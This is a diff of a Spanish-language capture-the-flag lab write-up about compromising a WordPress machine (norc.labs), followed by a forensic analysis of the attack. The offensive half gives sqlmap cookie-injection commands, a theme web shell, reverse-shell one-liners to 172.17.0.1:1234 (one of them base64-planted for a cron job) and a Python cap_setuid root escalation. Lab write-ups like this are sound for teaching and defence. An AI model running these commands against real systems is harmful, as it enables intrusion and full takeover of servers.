@@ -5,11 +5,11 @@ Una vez desplegada la máquina virtual, lo primero que realizamos es un nmap par
 - Puerto 22: SSH.
 - Puerto 80: HTTP.
 
-![Nmap](A_Docs/nmap.png)
+![Nmap](A_Docs/Primer_ejercicio/nmap.png)
 
 Al intentar acceder por HTTP, nos encontramos que hay una redirección a norc.labs. Para poder seguirla y que se resuelva correctamente la petición, tenemos que actualizar nuestro /etc/hosts añadiendo una nueva entrada:
 
-![Norc Labs](A_Docs/norclabs.png)
+![Norc Labs](A_Docs/Primer_ejercicio/norclabs.png)
 
 Una vez actualizado el fichero, accedemos y encontramos una página de login en el que nos deja introducir una contraseña. Podríamos usar algún método de fuerza bruta para obtenerla ya que no hay un límite de intentos, pero buscamos otra solución.
 
@@ -22,7 +22,7 @@ gobuster dir -u http://norc.labs -w /usr/share/wordlists/dirb/common.txt -t 50 -
 
 Lo ejecutamos sobre la URL con una wordlist por defecto de gobuster y buscamos archivos php, html o txt. Además, ignoramos las respuestas que devuelvan un 404 o 302. Los directorios más interesantes que obtenemos son los siguientes:
 
-![Gobuster](A_Docs/gobuster.png)
+![Gobuster](A_Docs/Primer_ejercicio/Primer ejerciciogobuster.png)
 
  Son directorios comunes en Wordpress, por lo que ya tenemos más información sobre la página. Si accedemos a wp-admin, vemos que es una página de login de wordpress, pero aquí no podemos aplicar fuerza bruta para la contraseña ya que solo hay 3 intentos para introducirla. Pero sabiendo que es un wordpress, ya tenemos la información de que existe una base de datos y seguramente algún plugin que pueda ser vulnerable. 
 
@@ -32,7 +32,7 @@ Empezamos por buscar algún plugin. Buscamos algún fichero en internet que cont
 ffuf -u http://norc.labs/FUZZ -w plugins.txt -fs 0 -fc 403
 ```
 
-![Ffuf](A_Docs/ffuf.png)
+![Ffuf](A_Docs/Primer_ejercicio/ffuf.png)
 
 
 Podemos ver que está corriendo (Status 200) el plugin de wp-fastest-cache, e investigando sobre sus posibles vulnerabilidades encontramos que es sensible a sql injection.  Es vulnerable a la inyección en una cookie mediante el siguiente comando:
@@ -54,7 +54,7 @@ sqlmap -u "http://norc.labs/wp-login.php" --cookie="wordpress_logged_in=*" --dbm
 
 La salida que obtenemos son todas las tablas de esa base de datos:
 
-![Base de datos](A_Docs/db_gen.png)
+![Base de datos](A_Docs/Primer_ejercicio/db_gen.png)
 
 La que más nos interesa es la tabla de wp_users, ya que es donde podemos obtener los datos para acceder a la página de wordpress. Ejecutamos el comando para obtener los datos de esa tabla:
 
@@ -62,7 +62,7 @@ La que más nos interesa es la tabla de wp_users, ya que es donde podemos obtene
 sqlmap -u "http://norc.labs/wp-login.php" --cookie="wordpress_logged_in=*" --dbms=mysql --dump -D wordpress -T wp_users
 ```
 
-![Base de datos](A_Docs/db.png)
+![Base de datos](A_Docs/Primer_ejercicio/db.png)
 
 Obtenemos el usuario, su correo electrónico y también la contraseña, aunque hasheada, por lo que no nos sirve para acceder.
 
@@ -74,7 +74,7 @@ Una vez dentro de WordPress, tendremos acceso a varias funcionalidades. Entre el
 
 Si un atacante logra acceder al panel de administración, puede editar archivos clave del tema, como el index.php del theme Twenty Twenty-Two, para insertar código malicioso. A través de esta modificación, es posible ejecutar comandos en el servidor, establecer conexiones remotas o incluso crear una puerta trasera para acceder al sitio de manera persistente.
 
-![Script malicioso](A_Docs/Twentytwenty-two.png)
+![Script malicioso](A_Docs/Primer_ejercicio/Twentytwenty-two.png)
 
 ```bash
 http://norc.labs/wp-content/themes/twentytwentytwo/index.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F1234%200%3E%261%27
@@ -82,7 +82,7 @@ http://norc.labs/wp-content/themes/twentytwentytwo/index.php?cmd=bash%20-c%20%27
 
 Establecemos un shell inverso que nos permite atraves de una llamada http conectarnos a la maquína.
 
-![Escalada de priviliegios: www-data ](A_Docs/EscuchaDePuertoUsuarioPorDefecto.png)
+![Escalada de priviliegios: www-data ](A_Docs/Primer_ejercicio/EscuchaDePuertoUsuarioPorDefecto.png)
 
 Una vez dentro de la máquina, nos encontraremos ejecutando comandos con el usuario www-data, que es el usuario por defecto de servidores web como Apache y Nginx. Este usuario tiene permisos limitados dentro del sistema, lo que restringe nuestras acciones y evita que podamos modificar archivos críticos o ejecutar comandos con privilegios elevados.
 
@@ -90,7 +90,7 @@ El primer paso será explorar los distintos archivos y directorios en busca de i
 
 Al analizar el sistema, encontramos un script llamado cron_script.sh dentro del directorio del usuario kvlz. Observamos que su función principal es leer el contenido de un archivo llamado wp-encrypted.txt, el cual está cifrado en Base64, luego desencriptarlo y volcar el resultado en /tmp/decoded.txt. A mayores, utilizando la herramienta pspy comprobamos que la terea se ejecuta una vez por minuto.
 
-![Directorios y archivos de interés: kvlz](A_Docs/DirectoriosKvzlx.png)
+![Directorios y archivos de interés: kvlz](A_Docs/Primer_ejercicio/DirectoriosKvzlx.png)
 
 Este comportamiento sugiere que el script se ejecuta de manera automática en intervalos de tiempo, posiblemente a través de una tarea programada con cron.
 
@@ -100,7 +100,7 @@ Dado que el archivo wp-encrypted.txt no existe en el sistema, podemos aprovechar
 echo "bash -i &> /dev/tcp/172.17.0.1/1234 0>&1" | base64 > /var/www/html/.wp-encrypted.txt
 ```
 
-![Escalada de priviliegios: www-kvlz](A_Docs/EscuchaDePuertoKvlx.png)
+![Escalada de priviliegios: www-kvlz](A_Docs/Primer_ejercicio/EscuchaDePuertoKvlx.png)
 
 Al investigar los archivos en el sistema, no encontramos binarios con permisos inusuales que pudieran explotarse directamente para la escalada de privilegios. Sin embargo, observamos que en el directorio /opt está instalada una versión de Python, lo que podiamos intuir, ya que en el análisis con la herramienta pspy, notamos que los permisos de ejecución de Python fueron retirados para el usuario www-data.
 
@@ -108,7 +108,7 @@ Centrandonos en pyhon procedemos a utilizar la herramienta getcap para analizar 
 
 Como no podemos instalar la herramienta directamente en la maquina vulnerable lo que haremos es crear un servidor que corra en el puerto 8080 y nos permita descargar atraves de wget los ficheros necesarios para la ejecución de la herramienta desde la máquina vulnerable.
 
-![Capabilities](A_Docs/getCapSearch.png)
+![Capabilities](A_Docs/Primer_ejercicio/getCapSearch.png)
 
 Con la ejecución del comando observamos que phyton puede tiene asignada la capacidad cap_setuid=ep. En Linux, esta capacidad permite otorgar privilegios específicos a binarios o procesos sin que tengan que ser ejecutados directamente como root. Para intentar explotar esta aparente vulnerabilidad intentaremos ejecutar el siguiente comando: 
 
@@ -119,7 +119,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 Como resultado, conseguimos acceder al usuario root con privilegios elevados.
 
-![Resultado final](A_Docs/EntradaRoot.png)
+![Resultado final](A_Docs/Primer_ejercicio/EntradaRoot.png)
 
 ## Fase 2: Análisis Forense Post-Explotación
 
@@ -226,12 +226,43 @@ root         413  0.0  0.1  13828  7720 pts/0    S    17:44   0:00  |           
 root         414  0.0  0.0   2576  1520 pts/0    S    17:44   0:00  |                           \_ sh -c /bin/bash
 root         415  0.0  0.0   4568  3300 pts/0    S+   17:44   0:00  |                               \_ /bin/bash
 ```
-Con forest podemos observar que el usuario kvzlx ha creado un terminal iterativo de python y ha inicaido sesión con el usuario root, lo que indica una clara escalada de privilegios. 
 
+Con forest podemos observar que el usuario kvzlx ha creado un terminal iterativo de Python y ha iniciado sesión con el usuario root, lo que indica una clara escalada de privilegios.
 
+El proceso que revela esta actividad es el siguiente:
 
-Para ello nos apoyaremos en la herramienta wireShark. Esta herramienta nos permite tener una visualización sencilla de todo el tráfico de la máquina y realizar filtrados de manera sencilla, lo que nos permite encontar comportamientos extraños en nuestro sistema.
+```bash
+root         413  0.0  0.1  13828  7720 pts/0    S    17:44   0:00  |   \_ /opt/python3 -c import os; os.setuid(0); os.system("/bin/bash")
+```
 
+Aquí, se ha ejecutado un script de Python con la función os.setuid(0), que cambia el usuario efectivo del proceso a root. Luego, se abre un shell de bash, permitiendo al atacante obtener control total del sistema con privilegios administrativos. Este comando fue ejecutado desde un shell interactivo (bash -i), lo que sugiere que el atacante ya tenía control sobre un usuario de menor privilegio antes de escalar a root.
 
+Antes de esto, el usuario kvzlx ejecutó el siguiente comando:
 
+```bash
+kvzlx        410  0.0  0.2  13880  8308 ?        S    17:44   0:00  |   \_ python3 -c import pty; pty.spawn("/bin/bash")
+```
 
+Este comando utiliza Python para generar un shell interactivo (pseudo-TTY), lo que le permitió ejecutar comandos de manera más flexible.
+
+Siguiendo el análisis se puede observar que antes de utilizar python que se ha ejecutado una tarea de cron, concretamente un proceso ubicado en /home/kvzlx/.cron_script.sh, cuyo funcionamiento ya hemos explicado en el primer apartado de la memoria. Desde la perspectiva del analista, quedaría comprobar si el script ha sido manipulado de manera maliciosa. Para ello, se puede utilizar journalctl, que permite analizar los registros del sistema y verificar si el archivo que guarda el código encriptado ha sido creado, modificado o eliminado.
+
+Una vez detectado como ha sido el proceso mediante el cual el atacante ha tenido acceso a nuestro sistema como el usuario por defecto de wordpress y ha ido escalando en privilegios, nos faltaría realizar comprobar como ha entrado al sistema en primer lugar. 
+
+Para comenzar esta parte del análisis, nos apoyaremos en la herramienta Wireshark, que nos permite monitorear el tráfico que ha recibido nuestro sistema. La imagen que se observa a continuación muestra un filtrado de las llamadas HTTP que ha recibido la máquina desde la IP que nos ha atacado.
+
+![Filtrado de llamadas](A_Docs/Segundo_ejercicio/llamadas_http.png)
+
+Se ha observado que la mayoría de las solicitudes HTTP consisten en llamadas GET a recursos como wp-content, wp-login y la página principal del sistema. Este patrón de acceso repetido y frecuente a los mismos recursos sugiere un posible ataque de denegación de servicio (DoS). Sin embargo, al profundizar en los detalles de las solicitudes, se ha identificado que en el cuerpo de la llamada HTTP se está insertando código malicioso a través de la cookie wordpress_logged_in. Esto indica que el ataque podría estar relacionado con técnicas de SQL injection, específicamente un ataque basado en tiempo, como los que realiza sqlmap, que buscan extraer información sobre la base de datos de WordPress.
+
+![Detalles de la llamada](A_Docs/Segundo_ejercicio/información_llamada.png)
+
+Para verificar si nuestra aplicación es vulnerable a este tipo de ataque, podemos utilizar sqlmap desde una perspectiva de monitoreo. Esto nos permitirá comprobar si la cookie wordpress_logged_in está siendo explotada como un punto débil y si está siendo utilizada para obtener información sensible de la base de datos. Como es lógico, el analista llegaría a la conclusión de que efectivamente es lo que ha ocurrido.
+
+Recopilando la información obtenida, el analista ya ha logrado determinar cómo el atacante consiguió las credenciales del usuario admin para acceder a WordPress y, posteriormente, cómo escaló privilegios dentro del sistema hasta obtener acceso como root.
+
+La última fase del análisis consiste en identificar el método exacto que el atacante utilizó para obtener acceso al sistema desde una terminal de comandos. En particular, queremos determinar cómo logró ejecutar un shell inverso, lo que le permitió establecer una conexión remota con el servidor. Sabemos que esto ocurrió gracias al comando forest, que previamente mostró evidencia de una conexión activa.
+
+Al investigar otras solicitudes HTTP realizadas por la dirección IP atacante contra nuestro servidor, hemos identificado la inyección de código malicioso en el tema Twenty Twenty-Two de WordPress. Se ha modificado su comportamiento a través del panel de administración de WordPress, permitiendo que el atacante ejecute comandos arbitrarios en el servidor.
+
+Este hallazgo sugiere que el atacante explotó una vulnerabilidad en la carga de temas de WordPress para inyectar código y ejecutar comandos remotos, facilitando la obtención de acceso persistente al sistema.
